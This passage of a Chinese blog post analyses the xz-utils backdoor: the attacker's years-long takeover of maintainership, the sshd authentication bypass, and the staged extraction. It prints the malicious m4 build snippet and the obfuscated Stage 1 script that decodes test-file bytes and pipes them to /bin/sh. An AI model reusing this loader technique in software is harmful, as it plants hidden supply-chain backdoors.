<p><a class="lightgallery" href="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640.png?size=large" data-thumbnail="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640.png?size=small" data-sub-html="<h2>img</h2>"><img loading="lazy" src="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640.png" alt="img" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640.png?size=small, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640.png?size=medium 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640.png?size=large 2x" data-title="img" style="--width: 1080px;--aspect-ratio: 1080 / 707;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>目前迹象表明，后门作者有选择性的针对 linux 发行版下手。但这个 liblzma 可不只Linux上用。比如目前流行的iOS越狱环境，大部分 tweak 包还是以 .deb 格式发行，比较新的版本就用到了 lzma 作为压缩。</p>
<p>除此之外近期有在 macOS 上使用 brew 安装过 xz 这个包应该也受影响，很多 brew 包都依赖了 xz，你可能不知不觉就装上了，还好暂时不能证明这个后门会感染 macOS。</p>
<p>Andres 的电子邮件里有对整个故事精彩描述。还有有趣的部分是带有混淆后门的二进制文件本身，<a href="https://www.openwall.com/lists/oss-security/2024/03/29/4"target="_blank" rel="external nofollow noopener noreferrer">邮件原文在这</a>。</p>
<p><a class="lightgallery" href="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240405174100383.png?size=large" data-thumbnail="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240405174100383.png?size=small" data-sub-html="<h2>image-20240405174100383</h2>"><img loading="lazy" src="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240405174100383.png" alt="image-20240405174100383" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240405174100383.png?size=small, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240405174100383.png?size=medium 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240405174100383.png?size=large 2x" data-title="image-20240405174100383" style="--width: 867px;--aspect-ratio: 867 / 635;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>从5.6.0版本开始，在xz的上游tarball包中发现了恶意代码。通过一系列复杂的混淆手段，liblzma的构建过程从伪装成测试文件的源代码中提取出预构建的目标文件，然后用它来修改liblzma代码中的特定函数。这导致生成了一个被修改过的liblzma库，任何链接此库的软件都可能使用它，从而拦截并修改与此库的数据交互。</p>
<p>xz 5.6.0和5.6.1版本库中存在的恶意注入只包含在tarball下载包中。Git发行版中缺少触发恶意代码构建的M4宏。注入期间构建时使用的第二阶段工件存在于Git存储库中，以防存在恶意的M4宏。如果不合并到构建中，第二阶段文件是无害的。</p>
<p>在发现者的演示中，发现它干扰了OpenSSH守护进程。虽然OpenSSH没有直接链接到liblzma库，但它以一种使其暴露于恶意软件的方式与systemd通信，因为systemd链接到了liblzma。</p>
<p>恶意构建会通过systemd干扰sshd的认证。SSH是一种常用的协议，用于远程连接系统，而sshd是允许访问的服务。在适当的情况下，这种干扰有可能使恶意行为体破坏sshd认证，并远程未经授权访问整个系统。</p>
<p>整个后门故事非常精彩，攻击者为此整整潜伏了三年，只差一点点就可以往众多 Linux发行版的 sshd 注入后门，可用于绕过密钥验证，后果不堪设想。</p>
<p><strong>省流概括</strong>:</p>
<ol>
<li>
<p>攻击者 JiaT75 (Jia Tan) 于2021年注册了 GitHub 账号，之后积极参与xz项目的维护，并逐渐获取信任，于2022年成为了xz的定期贡献者，获得了直接 commit 代码的权利。2023年1月7日JiaT75合并了他们的第一次提交。2024年项目URL变更为http://xz.tukaani.org/xz-utils/，进一步增加了JiaT75对该项目的控制。</p>
</li>
<li>
<p>JiaT75 在最近几个月的一次 commit 中，悄悄加入了 bad-3-corrupt lzma2.xz 和 good-large compressed.lzma 两个看似无害的测试用二进制数据，然而在编译脚本中，在特定条件下会从这两个文件中读取内容对编译结果进行修改，致使编译结果和公开的源代码不一致。</p>
</li>
<li>
<p>目前初步的研究显示，注入的代码会使用 glibc 的 IFUNC 去 HookOpensSH的 RSA public decrypt 函数，致使攻击者可以通过构造特定的验证数据绕过 RSA 签名验证。(具体细节还在分析中)</p>
</li>
<li>
<p>只要是同时使用了 liblzma和 OpenSsH的程序就会受到影响，最直接的目标就是 sshd，使得攻击者可以构造特定请求，绕过密钥验证远程访问。</p>
</li>
<li>
<p>受影响的 xz-utils 包已经被并入 Debian testing 中进行测试，攻击者同时也在尝试并入 fedora 和 ubuntu。</p>
</li>
<li>
<p>幸运的是，注入的代码似乎存在某种 Bug，导致特定情况下 sshd 的 CPU占用飙升。被安全研究人员AndresFrund注意到了，并报告给 oss-security，致使此事败漏。如果不是因为这个 Bug，那么该后门很有可能被并入主流发行版的stable 版本，那么将形成一场前所未有的重大安全事件。</p>
</li>
</ol>
<p>另外从一些细节能看出来攻击者非常用心:</p>
<p>攻击者抢在 ubuntu beta freeze 的几天前才尝试让新版本并入，以期望减少在测试期间被发现的时间。</p>
<p>xz-utils 项目的原维护者 Lasse Colin(Larhzu)，有着定期进行internetbreaks的习惯，而且最近正在进行，导致这些变动他并没有review的机会，即使到现在也没能联系上他本人。这可能也是攻击者选定xz-utils 项目的原因之一。</p>
<p>更多的细节还在被分析中，目前 GitHub 已经关停了整个 xz项目。</p>
<h2 id="技术细节" class="heading-element"><span>技术细节</span>
  <a href="#%e6%8a%80%e6%9c%af%e7%bb%86%e8%8a%82" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>很值得关注的部分一是整个新式攻击手法模型，二是混淆手段和思路，还有就带有后门的混淆二进制文件本身了。</p>
<p>Andres Freund 邮件原文有后门程序的详细分析，但由于发现者不是安全研究人员，也不擅长逆向，所以都是以观察分析类发现为主。</p>
<p>推上@Thomas Roccia也制作了分析图：</p>
<p><a class="lightgallery" href="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/b5157017fbcebb8d.png?size=large" data-thumbnail="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/b5157017fbcebb8d.png?size=small" data-sub-html="<h2>img</h2>"><img loading="lazy" src="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/b5157017fbcebb8d.png" alt="img" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/b5157017fbcebb8d.png?size=small, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/b5157017fbcebb8d.png?size=medium 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/b5157017fbcebb8d.png?size=large 2x" data-title="img" style="--width: 1217px;--aspect-ratio: 1217 / 1704;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>详细展开下上述内容，将Stage 1 前的部分，暂时称为 Stage 0。</p>
<p>目前 GitHub 已经关停了整个 xz项目，但可以从 <a href="https://github.com/thesamesam/xz-archive"target="_blank" rel="external nofollow noopener noreferrer">备份仓库</a> 进行下载分析。</p>
<h3 id="stage-0" class="heading-element"><span>Stage 0</span>
  <a href="#stage-0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>从<a href="https://salsa.debian.org/debian/xz-utils/-/blob/46cb28adbbfb8f50a10704c1b86f107d077878e6/m4/build-to-host.m4"target="_blank" rel="external nofollow noopener noreferrer">m4/build-to-host.m4</a>文件开始。以下是相关代码片段：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">gl_<span class="o">[</span><span class="nv">$1</span><span class="o">]</span><span class="nv">_config</span><span class="o">=</span><span class="s1">&#39;sed \&#34;r\n\&#34; $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null&#39;</span>
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl"><span class="nv">gl_path_map</span><span class="o">=</span><span class="s1">&#39;tr &#34;\t \-_&#34; &#34; \t_\-&#34;&#39;</span>
</span></span><span class="line"><span class="cl">...</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="lightgallery" href="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406005935000.png?size=large" data-thumbnail="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406005935000.png?size=small" data-sub-html="<h2>image-20240406005935000</h2>"><img loading="lazy" src="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406005935000.png" alt="image-20240406005935000" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406005935000.png?size=small, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406005935000.png?size=medium 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406005935000.png?size=large 2x" data-title="image-20240406005935000" style="--width: 1169px;--aspect-ratio: 1169 / 1093;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>进行了一个字符替换，将制表符<code>\t</code>、空格<code>\ </code>、连字符<code>-</code>、下划线<code>_</code>，依次替换为了空格<code>\ </code>、制表符<code>\t</code>、下划线<code>_</code>、连字符<code>-</code></p>
<p>这段代码在构建过程中的某个地方运行，提取第一阶段脚本。概述如下：</p>
<ol>
<li><code>sed \&quot;r\n\&quot; $gl_am_configmake</code>：读取 <code>tests/files/bad-3-corrupt_lzma2.xz </code>文件中的字节，并用作下一步的输入。读取完所有内容后，会添加换行符<code>\n</code>;</li>
<li>运行 tr 命令，进行字符替换，将选定的字符更改为其他字符，将制表符<code>\t</code>、空格<code>\ </code>、连字符<code>-</code>、下划线<code>_</code>，依次替换为了空格<code>\ </code>、制表符<code>\t</code>、下划线<code>_</code>、连字符<code>-</code>，它对<code>tests/files/bad-3-corrupt_lzma2.xz</code> 文件中的字节进行替换，这使得 bad-3-corrupt_lzma2.xz 再次形成了正确的 xz 流。</li>
<li>在此阶段的最后一步中，提取固定的 xz 字节流，并忽略错误（该流似乎被截断，但这并不重要，因为整个有意义的输出已被写出）。其结果是Stage 1的脚本，该脚本会立即执行。</li>
</ol>
<p>下面是 5.6.0 版本解压后的Stage 1 脚本</p>
<p><a class="lightgallery" href="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406211624801.png?size=large" data-thumbnail="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406211624801.png?size=small" data-sub-html="<h2>image-20240406211624801</h2>"><img loading="lazy" src="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406211624801.png" alt="image-20240406211624801" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406211624801.png?size=small, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406211624801.png?size=medium 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240406211624801.png?size=large 2x" data-title="image-20240406211624801" style="--width: 1900px;--aspect-ratio: 1900 / 672;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<h3 id="stage-1" class="heading-element"><span>Stage 1</span>
  <a href="#stage-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>在Andres 的电子邮件中是以“####Hello####”开头的 bash 文件。以下是 5.6.1版本</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1">####Hello####</span>
</span></span><span class="line"><span class="cl"><span class="c1"># a few binary bytes here, but as it&#39;s a comment they are ignorred</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span> ! <span class="k">$(</span>uname<span class="k">)</span> <span class="o">=</span> <span class="s2">&#34;Linux&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span> ! <span class="k">$(</span>uname<span class="k">)</span> <span class="o">=</span> <span class="s2">&#34;Linux&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span> ! <span class="k">$(</span>uname<span class="k">)</span> <span class="o">=</span> <span class="s2">&#34;Linux&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span> ! <span class="k">$(</span>uname<span class="k">)</span> <span class="o">=</span> <span class="s2">&#34;Linux&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span> ! <span class="k">$(</span>uname<span class="k">)</span> <span class="o">=</span> <span class="s2">&#34;Linux&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">exit</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="sb">`</span>grep ^srcdir<span class="o">=</span> config.status<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">test</span> -f ../../config.status<span class="p">;</span><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">eval</span> <span class="sb">`</span>grep ^srcdir<span class="o">=</span> ../../config.status<span class="sb">`</span>
</span></span><span class="line"><span class="cl"><span class="nv">srcdir</span><span class="o">=</span><span class="s2">&#34;../../</span><span class="nv">$srcdir</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">i</span><span class="o">=</span><span class="s2">&#34;((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +939)&#34;</span><span class="p">;</span><span class="o">(</span>xz -dc <span class="nv">$srcdir</span>/tests/files/good-large_compressed.lzma<span class="p">|</span><span class="nb">eval</span> <span class="nv">$i</span><span class="p">|</span>tail -c +31233<span class="p">|</span>tr <span class="s2">&#34;\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113&#34;</span> <span class="s2">&#34;\0-\377&#34;</span><span class="o">)</span><span class="p">|</span>xz -F raw --lzma1 -dc<span class="p">|</span>/bin/sh
</span></span><span class="line"><span class="cl"><span class="c1">####World####</span></span></span></code></pre></td></tr></table>
</div>
</div><p>可以看到5.6.0 和 5.6.1 的一些区别：</p>
<p>第一个区别是第二行注释中的随机字节。在5.6.0 是 86 F9 5A F7 2E 68 6A BC, 而在 5.6.1 是 E5 55 89 B7 24 04 D8 17. 暂时不确定这些差异是否有意义。</p>
<p>第二个区别是5.6.1版本添加了检测是否在 Linux 上运行代码，而它重复了 5 次，这很奇怪。</p>
<p>先分析第 2 阶段提取代码，即带有很多head的<code>export i=... </code>行。进行简单拆分：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">i</span><span class="o">=</span><span class="s2">&#34;((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +939)&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">(</span>xz -dc <span class="nv">$srcdir</span>/tests/files/good-large_compressed.lzma<span class="p">|</span><span class="nb">eval</span> <span class="nv">$i</span><span class="p">|</span>tail -c +31233<span class="p">|</span>tr <span class="s2">&#34;\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113&#34;</span> <span class="s2">&#34;\0-\377&#34;</span><span class="o">)</span><span class="p">|</span>xz -F raw --lzma1 -dc<span class="p">|</span>/bin/sh</span></span></code></pre></td></tr></table>
</div>
</div><ol>
<li>
<p>开头的<code>export i=... </code> 只是一个函数定义。它会在Stage 2 和 Stage 3 中被调用。</p>
</li>
<li>
<p>第 2 步是将 <code>good-large_compressed.lzma</code> 文件解压缩到标准输出 (xz -dc) ，并用作下一步的输入；</p>
</li>
<li>
<p>然后会调用 i 函数 (<code>eval $i</code>)。该函数基本上是一系列head调用，要么输出接下来的 N 个字节（<code>head -c +N</code>），要么跳过接下来的 N 个字节（<code>head -c +N &gt;/dev/null</code>）。i 函数最终实现：忽略 1024 个字节，再输出 2048 个字节，忽略 1024 个字节，再输出 2048 个字节&hellip;依此类推，直到到达文件的最末尾，其中只有 724 个字节（在 5.6.0 中）或 939输出字节（在 5.6.1 中）。</p>
</li>
<li>
<p>接下去执行 <code>tail -c +31233 </code>忽略数据的初始部分（<code>tail -c +N</code> 表示“从字节 N 开始输出”，注：初始部分隐藏了二进制后门，会将在下一阶段中提取）。在 5.6.0 中，这将是前 31264 个字节，在 5.6.1 中是 31232 。</p>
</li>
<li>
<p>第5步执行 tr 命令，用作简单的替换密码，密钥（字节值映射）在 5.6.0 和 5.6.1 中不同，两种情况下，都有 6 个范围映射到整个 0 - 255（即八进制 377）范围。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">5.6.0: tr <span class="s2">&#34;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&#34;</span> <span class="s2">&#34;\0-\377&#34;</span>
</span></span><span class="line"><span class="cl">5.6.1: tr <span class="s2">&#34;\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113&#34;</span> <span class="s2">&#34;\0-\377&#34;</span></span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>在最后一步中，解密的数据被解压缩（<code>xz -F raw --lzma1 -dc</code>），并且立即执行Stage 2。</p>
</li>
</ol>
<p>5.6.0 解压结果部分：</p>
